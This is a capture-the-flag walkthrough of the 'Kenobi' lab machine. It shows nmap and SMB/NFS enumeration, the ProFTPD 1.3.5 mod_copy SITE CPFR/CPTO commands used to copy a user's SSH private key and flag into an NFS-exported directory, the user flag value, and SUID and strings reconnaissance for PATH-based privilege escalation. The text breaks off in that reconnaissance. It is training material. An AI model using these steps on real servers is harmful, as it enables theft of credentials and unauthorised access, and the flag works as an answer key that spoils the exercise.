# Writeup: Kenobi

### Deploy the vulnerable machine

*Make sure you're connected to our network and deploy the machine*

No answer needed

*Scan the machine with nmap, how many ports are open?*

Scanning via `nmap -A --script vuln 10.10.135.224` reveals 7 open ports and provides information on possible vulnerabilities:

```
nmap -A --script vuln 10.10.135.224
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-05 05:37 CDT
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.135.224
Host is up (0.037s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
|_sslv2-drown: 
| vulners: 
|   cpe:/a:proftpd:proftpd:1.3.5: 
|     	SAINT:950EB68D408A40399926A4CCAD3CC62E	10.0	https://vulners.com/saint/SAINT:950EB68D408A40399926A4CCAD3CC62E	*EXPLOIT*
|     	SAINT:63FB77B9136D48259E4F0D4CDA35E957	10.0	https://vulners.com/saint/SAINT:63FB77B9136D48259E4F0D4CDA35E957	*EXPLOIT*
|     	SAINT:1B08F4664C428B180EEC9617B41D9A2C	10.0	https://vulners.com/saint/SAINT:1B08F4664C428B180EEC9617B41D9A2C	*EXPLOIT*
|     	PROFTPD_MOD_COPY	10.0	https://vulners.com/canvas/PROFTPD_MOD_COPY	*EXPLOIT*
|     	PACKETSTORM:132218	10.0	https://vulners.com/packetstorm/PACKETSTORM:132218	*EXPLOIT*
|     	PACKETSTORM:131567	10.0	https://vulners.com/packetstorm/PACKETSTORM:131567	*EXPLOIT*
|     	PACKETSTORM:131555	10.0	https://vulners.com/packetstorm/PACKETSTORM:131555	*EXPLOIT*
|     	PACKETSTORM:131505	10.0	https://vulners.com/packetstorm/PACKETSTORM:131505	*EXPLOIT*
|     	MSF:EXPLOIT/UNIX/FTP/PROFTPD_MODCOPY_EXEC	10.0	https://vulners.com/metasploit/MSF:EXPLOIT/UNIX/FTP/PROFTPD_MODCOPY_EXEC	*EXPLOIT*
|     	EDB-ID:37262	10.0	https://vulners.com/exploitdb/EDB-ID:37262	*EXPLOIT*
|     	EDB-ID:36803	10.0	https://vulners.com/exploitdb/EDB-ID:36803	*EXPLOIT*
|     	EDB-ID:36742	10.0	https://vulners.com/exploitdb/EDB-ID:36742	*EXPLOIT*
|     	CVE-2015-3306	10.0	https://vulners.com/cve/CVE-2015-3306
|     	1337DAY-ID-23720	10.0	https://vulners.com/zdt/1337DAY-ID-23720	*EXPLOIT*
|     	1337DAY-ID-23544	10.0	https://vulners.com/zdt/1337DAY-ID-23544	*EXPLOIT*
|     	SSV:61050	5.0	https://vulners.com/seebug/SSV:61050	*EXPLOIT*
|     	CVE-2019-19272	5.0	https://vulners.com/cve/CVE-2019-19272
|     	CVE-2019-19271	5.0	https://vulners.com/cve/CVE-2019-19271
|     	CVE-2019-19270	5.0	https://vulners.com/cve/CVE-2019-19270
|     	CVE-2019-18217	5.0	https://vulners.com/cve/CVE-2019-18217
|     	CVE-2016-3125	5.0	https://vulners.com/cve/CVE-2016-3125
|     	CVE-2013-4359	5.0	https://vulners.com/cve/CVE-2013-4359
|_    	CVE-2017-7418	2.1	https://vulners.com/cve/CVE-2017-7418
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.2p2: 
|     	PACKETSTORM:140070	7.8	https://vulners.com/packetstorm/PACKETSTORM:140070	*EXPLOIT*
|     	EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09	7.8	https://vulners.com/exploitpack/EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09	*EXPLOIT*
|     	EDB-ID:40888	7.8	https://vulners.com/exploitdb/EDB-ID:40888	*EXPLOIT*
|     	CVE-2016-8858	7.8	https://vulners.com/cve/CVE-2016-8858
|     	CVE-2016-6515	7.8	https://vulners.com/cve/CVE-2016-6515
|     	1337DAY-ID-26494	7.8	https://vulners.com/zdt/1337DAY-ID-26494	*EXPLOIT*
|     	SSV:92579	7.5	https://vulners.com/seebug/SSV:92579	*EXPLOIT*
|     	CVE-2016-10009	7.5	https://vulners.com/cve/CVE-2016-10009
|     	1337DAY-ID-26576	7.5	https://vulners.com/zdt/1337DAY-ID-26576	*EXPLOIT*
|     	SSV:92582	7.2	https://vulners.com/seebug/SSV:92582	*EXPLOIT*
|     	CVE-2016-10012	7.2	https://vulners.com/cve/CVE-2016-10012
|     	CVE-2015-8325	7.2	https://vulners.com/cve/CVE-2015-8325
|     	SSV:92580	6.9	https://vulners.com/seebug/SSV:92580	*EXPLOIT*
|     	CVE-2016-10010	6.9	https://vulners.com/cve/CVE-2016-10010
|     	1337DAY-ID-26577	6.9	https://vulners.com/zdt/1337DAY-ID-26577	*EXPLOIT*
|     	EXPLOITPACK:98FE96309F9524B8C84C508837551A19	5.8	https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19	*EXPLOIT*
|     	EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97	5.8	https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97	*EXPLOIT*
|     	EDB-ID:46516	5.8	https://vulners.com/exploitdb/EDB-ID:46516	*EXPLOIT*
|     	CVE-2019-6111	5.8	https://vulners.com/cve/CVE-2019-6111
|     	SSV:91041	5.5	https://vulners.com/seebug/SSV:91041	*EXPLOIT*
|     	PACKETSTORM:140019	5.5	https://vulners.com/packetstorm/PACKETSTORM:140019	*EXPLOIT*
|     	PACKETSTORM:136234	5.5	https://vulners.com/packetstorm/PACKETSTORM:136234	*EXPLOIT*
|     	EXPLOITPACK:F92411A645D85F05BDBD274FD222226F	5.5	https://vulners.com/exploitpack/EXPLOITPACK:F92411A645D85F05BDBD274FD222226F	*EXPLOIT*
|     	EXPLOITPACK:9F2E746846C3C623A27A441281EAD138	5.5	https://vulners.com/exploitpack/EXPLOITPACK:9F2E746846C3C623A27A441281EAD138	*EXPLOIT*
|     	EXPLOITPACK:1902C998CBF9154396911926B4C3B330	5.5	https://vulners.com/exploitpack/EXPLOITPACK:1902C998CBF9154396911926B4C3B330	*EXPLOIT*
|     	EDB-ID:40858	5.5	https://vulners.com/exploitdb/EDB-ID:40858	*EXPLOIT*
|     	CVE-2016-3115	5.5	https://vulners.com/cve/CVE-2016-3115
|     	SSH_ENUM	5.0	https://vulners.com/canvas/SSH_ENUM	*EXPLOIT*
|     	PACKETSTORM:150621	5.0	https://vulners.com/packetstorm/PACKETSTORM:150621	*EXPLOIT*
|     	MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS	5.0	https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS	*EXPLOIT*
|     	EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0	5.0	https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0	*EXPLOIT*
|     	EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283	5.0	https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283	*EXPLOIT*
|     	EDB-ID:45939	5.0	https://vulners.com/exploitdb/EDB-ID:45939	*EXPLOIT*
|     	CVE-2018-15919	5.0	https://vulners.com/cve/CVE-2018-15919
|     	CVE-2018-15473	5.0	https://vulners.com/cve/CVE-2018-15473
|     	CVE-2017-15906	5.0	https://vulners.com/cve/CVE-2017-15906
|     	CVE-2016-10708	5.0	https://vulners.com/cve/CVE-2016-10708
|     	1337DAY-ID-31730	5.0	https://vulners.com/zdt/1337DAY-ID-31730	*EXPLOIT*
|     	EDB-ID:45233	4.6	https://vulners.com/exploitdb/EDB-ID:45233	*EXPLOIT*
|     	EDB-ID:40963	4.6	https://vulners.com/exploitdb/EDB-ID:40963	*EXPLOIT*
|     	EDB-ID:40962	4.6	https://vulners.com/exploitdb/EDB-ID:40962	*EXPLOIT*
|     	EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF	4.3	https://vulners.com/exploitpack/EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF	*EXPLOIT*
|     	EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF	4.3	https://vulners.com/exploitpack/EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF	*EXPLOIT*
|     	CVE-2020-14145	4.3	https://vulners.com/cve/CVE-2020-14145
|     	CVE-2016-6210	4.3	https://vulners.com/cve/CVE-2016-6210
|     	1337DAY-ID-25440	4.3	https://vulners.com/zdt/1337DAY-ID-25440	*EXPLOIT*
|     	1337DAY-ID-25438	4.3	https://vulners.com/zdt/1337DAY-ID-25438	*EXPLOIT*
|     	CVE-2019-6110	4.0	https://vulners.com/cve/CVE-2019-6110
|     	CVE-2019-6109	4.0	https://vulners.com/cve/CVE-2019-6109
|     	CVE-2018-20685	2.6	https://vulners.com/cve/CVE-2018-20685
|     	SSV:92581	2.1	https://vulners.com/seebug/SSV:92581	*EXPLOIT*
|     	CVE-2016-10011	2.1	https://vulners.com/cve/CVE-2016-10011
|     	PACKETSTORM:151227	0.0	https://vulners.com/packetstorm/PACKETSTORM:151227	*EXPLOIT*
|     	PACKETSTORM:140261	0.0	https://vulners.com/packetstorm/PACKETSTORM:140261	*EXPLOIT*
|     	PACKETSTORM:138006	0.0	https://vulners.com/packetstorm/PACKETSTORM:138006	*EXPLOIT*
|     	PACKETSTORM:137942	0.0	https://vulners.com/packetstorm/PACKETSTORM:137942	*EXPLOIT*
|     	EDB-ID:46193	0.0	https://vulners.com/exploitdb/EDB-ID:46193	*EXPLOIT*
|     	EDB-ID:40136	0.0	https://vulners.com/exploitdb/EDB-ID:40136	*EXPLOIT*
|     	EDB-ID:40113	0.0	https://vulners.com/exploitdb/EDB-ID:40113	*EXPLOIT*
|     	EDB-ID:39569	0.0	https://vulners.com/exploitdb/EDB-ID:39569	*EXPLOIT*
|     	1337DAY-ID-32009	0.0	https://vulners.com/zdt/1337DAY-ID-32009	*EXPLOIT*
|     	1337DAY-ID-30937	0.0	https://vulners.com/zdt/1337DAY-ID-30937	*EXPLOIT*
|_    	1337DAY-ID-10010	0.0	https://vulners.com/zdt/1337DAY-ID-10010	*EXPLOIT*
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /admin.html: Possible admin folder
|_  /robots.txt: Robots file
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| vulners: 
|   cpe:/a:apache:http_server:2.4.18: 
|     	CVE-2017-7679	7.5	https://vulners.com/cve/CVE-2017-7679
|     	CVE-2017-7668	7.5	https://vulners.com/cve/CVE-2017-7668
|     	CVE-2017-3169	7.5	https://vulners.com/cve/CVE-2017-3169
|     	CVE-2017-3167	7.5	https://vulners.com/cve/CVE-2017-3167
|     	EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB	7.2	https://vulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB	*EXPLOIT*
|     	CVE-2019-0211	7.2	https://vulners.com/cve/CVE-2019-0211
|     	1337DAY-ID-32502	7.2	https://vulners.com/zdt/1337DAY-ID-32502	*EXPLOIT*
|     	CVE-2018-1312	6.8	https://vulners.com/cve/CVE-2018-1312
|     	CVE-2017-15715	6.8	https://vulners.com/cve/CVE-2017-15715
|     	CVE-2019-10082	6.4	https://vulners.com/cve/CVE-2019-10082
|     	CVE-2017-9788	6.4	https://vulners.com/cve/CVE-2017-9788
|     	CVE-2019-0217	6.0	https://vulners.com/cve/CVE-2019-0217
|     	EDB-ID:47689	5.8	https://vulners.com/exploitdb/EDB-ID:47689	*EXPLOIT*
|     	CVE-2020-1927	5.8	https://vulners.com/cve/CVE-2020-1927
|     	CVE-2019-10098	5.8	https://vulners.com/cve/CVE-2019-10098
|     	1337DAY-ID-33577	5.8	https://vulners.com/zdt/1337DAY-ID-33577	*EXPLOIT*
|     	CVE-2016-5387	5.1	https://vulners.com/cve/CVE-2016-5387
|     	SSV:96537	5.0	https://vulners.com/seebug/SSV:96537	*EXPLOIT*
|     	MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED	5.0	https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED	*EXPLOIT*
|     	EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D	5.0	https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D	*EXPLOIT*
|     	EXPLOITPACK:2666FB0676B4B582D689921651A30355	5.0	https://vulners.com/exploitpack/EXPLOITPACK:2666FB0676B4B582D689921651A30355	*EXPLOIT*
|     	EDB-ID:40909	5.0	https://vulners.com/exploitdb/EDB-ID:40909	*EXPLOIT*
|     	CVE-2020-1934	5.0	https://vulners.com/cve/CVE-2020-1934
|     	CVE-2019-0220	5.0	https://vulners.com/cve/CVE-2019-0220
|     	CVE-2019-0196	5.0	https://vulners.com/cve/CVE-2019-0196
|     	CVE-2018-17199	5.0	https://vulners.com/cve/CVE-2018-17199
|     	CVE-2018-17189	5.0	https://vulners.com/cve/CVE-2018-17189
|     	CVE-2018-1333	5.0	https://vulners.com/cve/CVE-2018-1333
|     	CVE-2018-1303	5.0	https://vulners.com/cve/CVE-2018-1303
|     	CVE-2017-9798	5.0	https://vulners.com/cve/CVE-2017-9798
|     	CVE-2017-15710	5.0	https://vulners.com/cve/CVE-2017-15710
|     	CVE-2016-8743	5.0	https://vulners.com/cve/CVE-2016-8743
|     	CVE-2016-8740	5.0	https://vulners.com/cve/CVE-2016-8740
|     	CVE-2016-4979	5.0	https://vulners.com/cve/CVE-2016-4979
|     	1337DAY-ID-28573	5.0	https://vulners.com/zdt/1337DAY-ID-28573	*EXPLOIT*
|     	CVE-2019-0197	4.9	https://vulners.com/cve/CVE-2019-0197
|     	EDB-ID:47688	4.3	https://vulners.com/exploitdb/EDB-ID:47688	*EXPLOIT*
|     	CVE-2020-11985	4.3	https://vulners.com/cve/CVE-2020-11985
|     	CVE-2019-10092	4.3	https://vulners.com/cve/CVE-2019-10092
|     	CVE-2018-1302	4.3	https://vulners.com/cve/CVE-2018-1302
|     	CVE-2018-1301	4.3	https://vulners.com/cve/CVE-2018-1301
|     	CVE-2018-11763	4.3	https://vulners.com/cve/CVE-2018-11763
|     	CVE-2016-4975	4.3	https://vulners.com/cve/CVE-2016-4975
|     	CVE-2016-1546	4.3	https://vulners.com/cve/CVE-2016-1546
|     	1337DAY-ID-33575	4.3	https://vulners.com/zdt/1337DAY-ID-33575	*EXPLOIT*
|     	CVE-2018-1283	3.5	https://vulners.com/cve/CVE-2018-1283
|     	CVE-2016-8612	3.3	https://vulners.com/cve/CVE-2016-8612
|     	PACKETSTORM:152441	0.0	https://vulners.com/packetstorm/PACKETSTORM:152441	*EXPLOIT*
|     	EDB-ID:46676	0.0	https://vulners.com/exploitdb/EDB-ID:46676	*EXPLOIT*
|     	EDB-ID:42745	0.0	https://vulners.com/exploitdb/EDB-ID:42745	*EXPLOIT*
|     	1337DAY-ID-663	0.0	https://vulners.com/zdt/1337DAY-ID-663	*EXPLOIT*
|     	1337DAY-ID-601	0.0	https://vulners.com/zdt/1337DAY-ID-601	*EXPLOIT*
|     	1337DAY-ID-4533	0.0	https://vulners.com/zdt/1337DAY-ID-4533	*EXPLOIT*
|     	1337DAY-ID-3109	0.0	https://vulners.com/zdt/1337DAY-ID-3109	*EXPLOIT*
|_    	1337DAY-ID-2237	0.0	https://vulners.com/zdt/1337DAY-ID-2237	*EXPLOIT*
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      39653/tcp   mountd
|   100005  1,2,3      43578/udp   mountd
|   100005  1,2,3      45119/tcp6  mountd
|   100005  1,2,3      53157/udp6  mountd
|   100021  1,3,4      36394/udp6  nlockmgr
|   100021  1,3,4      37371/tcp6  nlockmgr
|   100021  1,3,4      44257/tcp   nlockmgr
|   100021  1,3,4      52193/udp   nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     2-3 (RPC #100227)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: false
| smb-vuln-regsvc-dos: 
|   VULNERABLE:
|   Service regsvc in Microsoft Windows systems vulnerable to denial of service
|     State: VULNERABLE
|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
|       while working on smb-enum-sessions.
|_          

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 358.59 seconds

```

### Enumerating Samba for shares

The output of the previous command showed us that the two SMB ports are open on the target machine: 139 and 445. Now we can use nmap to find out, how many and which shares are present on this machine.

*Using the nmap command above, how many shares have been found?*

Using the command `nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.135.224` to enumerate shares revealed 3 shares:

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-05 06:02 CDT
Nmap scan report for 10.10.135.224
Host is up (0.037s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.135.224\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 2
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.135.224\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.135.224\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 6.21 seconds
```

We can now use an SMB client to connect to the target machines network shares. The anonymous share allows access for anonymous users so we will try this one.

*Once you're connected, list the files on the share. What is the file can you see?*

The file we can find on the server is called log.txt. This file contains information on

+ Information generated for Kenobi when generating an SSH key for the user
+ Information about the ProFTPD server.

*What port is FTP running on?*

The ProFTPD server runs on the standard FTP port 21.

*What mount can we see?*

The previous nmap scan showed port 111 was open with `rpcbind` running:

```
111/tcp  open  rpcbind     2-4 (RPC #100000).
```

Using nmap again to enumerate this via `nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.135.224` reveals /var:

``` 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-05 06:23 CDT
Nmap scan report for 10.10.135.224
Host is up (0.037s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *

Nmap done: 1 IP address (1 host up) scanned in 0.57 seconds
```

### Gain initial access with ProFtpd

ProFtpd is a free and open-source FTP server, compatible with Unix and Windows systems. Its also been vulnerable in the past software versions.

*What is the version?*

The version number of ProFtpd is 1.3.5 as shown by our previous nmap scan: `21/tcp   open  ftp         ProFTPD 1.3.5`.

*How many exploits are there for the ProFTPd running?*

To find exploits for a particular software we can use searchsploit via `searchsploit ProFTPd`:

```
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                    |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
FreeBSD - 'ftpd / ProFTPd' Remote Command Execution                                                                                                                               | freebsd/remote/18181.txt
ProFTPd - 'ftpdctl' 'pr_ctrls_connect' Local Overflow                                                                                                                             | linux/local/394.c
ProFTPd - 'mod_mysql' Authentication Bypass                                                                                                                                       | multiple/remote/8037.txt
ProFTPd - 'mod_sftp' Integer Overflow Denial of Service (PoC)                                                                                                                     | linux/dos/16129.txt
ProFTPd 1.2 - 'SIZE' Remote Denial of Service                                                                                                                                     | linux/dos/20536.java
ProFTPd 1.2 < 1.3.0 (Linux) - 'sreplace' Remote Buffer Overflow (Metasploit)                                                                                                      | linux/remote/16852.rb
ProFTPd 1.2 pre1/pre2/pre3/pre4/pre5 - Remote Buffer Overflow (1)                                                                                                                 | linux/remote/19475.c
ProFTPd 1.2 pre1/pre2/pre3/pre4/pre5 - Remote Buffer Overflow (2)                                                                                                                 | linux/remote/19476.c
ProFTPd 1.2 pre6 - 'snprintf' Remote Root                                                                                                                                         | linux/remote/19503.txt
ProFTPd 1.2.0 pre10 - Remote Denial of Service                                                                                                                                    | linux/dos/244.java
ProFTPd 1.2.0 rc2 - Memory Leakage                                                                                                                                                | linux/dos/241.c
ProFTPd 1.2.10 - Remote Users Enumeration                                                                                                                                         | linux/remote/581.c
ProFTPd 1.2.7 < 1.2.9rc2 - Remote Code Execution / Brute Force                                                                                                                    | linux/remote/110.c
ProFTPd 1.2.7/1.2.8 - '.ASCII' File Transfer Buffer Overrun                                                                                                                       | linux/dos/23170.c
ProFTPd 1.2.9 RC1 - 'mod_sql' SQL Injection                                                                                                                                       | linux/remote/43.pl
ProFTPd 1.2.9 rc2 - '.ASCII' File Remote Code Execution (1)                                                                                                                       | linux/remote/107.c
ProFTPd 1.2.9 rc2 - '.ASCII' File Remote Code Execution (2)                                                                                                                       | linux/remote/3021.txt
ProFTPd 1.2.x - 'STAT' Denial of Service                                                                                                                                          | linux/dos/22079.sh
ProFTPd 1.3 - 'mod_sql' 'Username' SQL Injection                                                                                                                                  | multiple/remote/32798.pl
ProFTPd 1.3.0 (OpenSUSE) - 'mod_ctrls' Local Stack Overflow                                                                                                                       | unix/local/10044.pl
ProFTPd 1.3.0 - 'sreplace' Remote Stack Overflow (Metasploit)                                                                                                                     | linux/remote/2856.pm
ProFTPd 1.3.0/1.3.0a - 'mod_ctrls' 'support' Local Buffer Overflow (1)                                                                                                            | linux/local/3330.pl
ProFTPd 1.3.0/1.3.0a - 'mod_ctrls' 'support' Local Buffer Overflow (2)                                                                                                            | linux/local/3333.pl
ProFTPd 1.3.0/1.3.0a - 'mod_ctrls' exec-shield Local Overflow                                                                                                                     | linux/local/3730.txt
ProFTPd 1.3.0a - 'mod_ctrls' 'support' Local Buffer Overflow (PoC)                                                                                                                | linux/dos/2928.py
ProFTPd 1.3.2 rc3 < 1.3.3b (FreeBSD) - Telnet IAC Buffer Overflow (Metasploit)                                                                                                    | linux/remote/16878.rb
ProFTPd 1.3.2 rc3 < 1.3.3b (Linux) - Telnet IAC Buffer Overflow (Metasploit)                                                                                                      | linux/remote/16851.rb
ProFTPd 1.3.3c - Compromised Source Backdoor Remote Code Execution                                                                                                                | linux/remote/15662.txt
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                                                                                                         | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                                                                                                               | linux/remote/36803.py
ProFTPd 1.3.5 - File Copy                                                                                                                                                         | linux/remote/36742.txt
ProFTPD 1.3.7a - Remote Denial of Service                                                                                                                                         | multiple/dos/49697.py
ProFTPd 1.x - 'mod_tls' Remote Buffer Overflow                                                                                                                                    | linux/remote/4312.c
ProFTPd IAC 1.3.x - Remote Command Execution                                                                                                                                      | linux/remote/15449.pl
ProFTPd-1.3.3c - Backdoor Command Execution (Metasploit)                                                                                                                          | linux/remote/16921.rb
WU-FTPD 2.4.2 / SCO Open Server 5.0.5 / ProFTPd 1.2 pre1 - 'realpath' Remote Buffer Overflow (1)                                                                                  | linux/remote/19086.c
WU-FTPD 2.4.2 / SCO Open Server 5.0.5 / ProFTPd 1.2 pre1 - 'realpath' Remote Buffer Overflow (2)                                                                                  | linux/remote/19087.c
WU-FTPD 2.4/2.5/2.6 / Trolltech ftpd 1.2 / ProFTPd 1.2 / BeroFTPD 1.3.4 FTP - glob Expansion                                                                                      | linux/remote/20690.sh
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

As ProFTPd is running in version 1.3.5, there are 3 exploits we can use.  One of the exploits allows us to to copy files from any part of the filesystem to a chosen destination without authentication (see: https://www.cvedetails.com/cve/CVE-2015-3306/).

*We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user.*

No answer needed

*We knew that the /var directory was a mount we could see (task 2, question 4). So we've now moved Kenobi's private key to the /var/tmp directory.+

No answer needed

*What is Kenobi's user flag (/home/kenobi/user.txt)?*

We're now going to copy Kenobi's private key using SITE CPFR and SITE CPTO commands. We first use `nc` to connect to the server via `nc 10.10.16.1 21`.

On the server we execute to copy the private key to to /var/tmp.

``` 
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```
We can also take a shortcut here and directly copy user.txt.

``` 
SITE CPFR /home/kenobi/user.txt
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/user.txt
250 Copy successful
```

We can now mount 10.10.16.1:/var to get the flag and kenobis ssh key:

```
root@kali:~# mkdir /mnt/kenobiNFS
root@kali:~# mount 10.10.16.1:/var /mnt/kenobiNFS
root@kali:~# ls -la /mnt/kenobiNFS/
total 56
drwxr-xr-x 14 root root    4096 Sep  4  2019 .
drwxr-xr-x  3 root root    4096 Apr  6 06:57 ..
drwxr-xr-x  2 root root    4096 Sep  4  2019 backups
drwxr-xr-x  9 root root    4096 Sep  4  2019 cache
drwxrwxrwt  2 root root    4096 Sep  4  2019 crash
drwxr-xr-x 40 root root    4096 Sep  4  2019 lib
drwxrwsr-x  2 root staff   4096 Apr 12  2016 local
lrwxrwxrwx  1 root root       9 Sep  4  2019 lock -> /run/lock
drwxrwxr-x 10 root crontab 4096 Sep  4  2019 log
drwxrwsr-x  2 root mail    4096 Feb 26  2019 mail
drwxr-xr-x  2 root root    4096 Feb 26  2019 opt
lrwxrwxrwx  1 root root       4 Sep  4  2019 run -> /run
drwxr-xr-x  2 root root    4096 Jan 29  2019 snap
drwxr-xr-x  5 root root    4096 Sep  4  2019 spool
drwxrwxrwt  6 root root    4096 Apr  6 06:53 tmp
drwxr-xr-x  3 root root    4096 Sep  4  2019 www
root@kali:~# cd /mnt/kenobiNFS/tmp/
root@kali:/mnt/kenobiNFS/tmp# more user.txt 
d0b0f3f53b6caa532a83915e19224899
```
The flag is d0b0f3f53b6caa532a83915e19224899.

### Privilege Escalation with Path Variable Manipulation

*What file looks particularly out of the ordinary?* 

After connecting via `ssh -i id_rsa kenobi@10.10.16.1` we can search for files that have the SUID bit set:

```
kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
```

/usr/bin/menu looks interesting.

*Run the binary, how many options appear?*

```
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
```

There are three options available.

*What is the root flag (/root/root.txt)?*

Strings is a command on Linux that looks for human readable strings on a binary. This shows us the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname):

```
# strings /usr/bin/menu
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
__isoc99_scanf
puts
__stack_chk_fail
printf
system
__libc_start_main
__gmon_start__
GLIBC_2.7
GLIBC_2.4
GLIBC_2.2.5
UH-`
AWAVA
AUATL
[]A\A]A^A_
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
curl -I localhost
uname -r
ifconfig
 Invalid choice
;*3$"
GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609
crtstuff.c
__JCR_LIST__
deregister_tm_clones
